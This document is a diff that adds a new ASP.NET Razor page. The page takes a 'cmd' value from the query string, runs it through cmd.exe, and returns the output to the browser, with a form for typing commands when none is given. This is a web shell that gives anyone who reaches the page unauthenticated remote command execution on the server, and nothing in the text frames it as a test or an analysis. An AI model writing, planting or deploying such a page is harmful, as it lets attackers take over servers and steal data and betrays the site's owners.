@@ -1,0 +1,27 @@
+@page
+@using System.Diagnostics
+@{
+    string cmd = Request.Query["cmd"];
+    if (!string.IsNullOrEmpty(cmd))
+    {
+        var process = new Process();
+        process.StartInfo.FileName = "cmd.exe";
+        process.StartInfo.Arguments = "/c " + cmd;
+        process.StartInfo.RedirectStandardOutput = true;
+        process.StartInfo.RedirectStandardError = true;
+        process.StartInfo.UseShellExecute = false;
+        process.Start();
+        
+        string output = process.StandardOutput.ReadToEnd();
+        string error = process.StandardError.ReadToEnd();
+        
+        <pre>@output@error</pre>
+    }
+    else
+    {
+        <form method="get">
+            <input type="text" name="cmd" />
+            <input type="submit" />
+        </form>
+    }
+}
